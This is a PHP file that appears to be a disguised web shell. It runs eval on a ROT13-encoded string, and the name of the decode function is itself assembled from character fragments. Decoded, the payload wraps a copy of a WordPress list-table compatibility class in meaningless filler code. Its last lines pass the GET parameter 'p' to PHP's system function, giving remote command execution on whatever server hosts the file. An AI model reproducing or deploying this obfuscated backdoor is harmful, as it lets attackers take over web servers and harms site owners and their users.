<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Urycre shapgvbaf sbe qvfcynlvat n yvfg bs vgrzf va na nwnkvsvrq UGZY gnoyr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Yvfg_Gnoyr
 * @fvapr 4.7.0
 */

/**
 * Urycre pynff gb or hfrq bayl ol onpx pbzcng shapgvbaf.
 *
 * @fvapr 3.1.0
 */
pynff _JC_Yvfg_Gnoyr_Pbzcng rkgraqf JC_Yvfg_Gnoyr {
	choyvp $_fperra;
	choyvp $_pbyhzaf;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat|JC_Fperra $fperra  Gur fperra ubbx anzr be fperra bowrpg.
	 * @cnenz fgevat[]         $pbyhzaf Na neenl bs pbyhzaf jvgu pbyhza VQf nf gur xrlf
	 *                                  naq genafyngrq pbyhza anzrf nf gur inyhrf.
	 */
	choyvp shapgvba __pbafgehpg( $fperra, $pbyhzaf = neenl() ) {
		vs ( vf_fgevat( $fperra ) ) {
			$fperra = pbaireg_gb_fperra( $fperra );
		}

		$guvf->_fperra = $fperra;

		vs ( ! rzcgl( $pbyhzaf ) ) {
			$guvf->_pbyhzaf = $pbyhzaf;
			nqq_svygre( 'znantr_' . $fperra->vq . '_pbyhzaf', neenl( $guvf, 'trg_pbyhzaf' ), 0 );
		}
	}

	/**
	 * Trgf n yvfg bs nyy, uvqqra, naq fbegnoyr pbyhzaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_pbyhza_vasb() {
		$pbyhzaf  = trg_pbyhza_urnqref( $guvf->_fperra );
		$uvqqra   = trg_uvqqra_pbyhzaf( $guvf->_fperra );
		$fbegnoyr = neenl();
		$cevznel  = $guvf->trg_qrsnhyg_cevznel_pbyhza_anzr();

		erghea neenl( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel );
	}

	/**
	 * Trgf n yvfg bs pbyhzaf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_pbyhzaf() {
		erghea $guvf->_pbyhzaf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>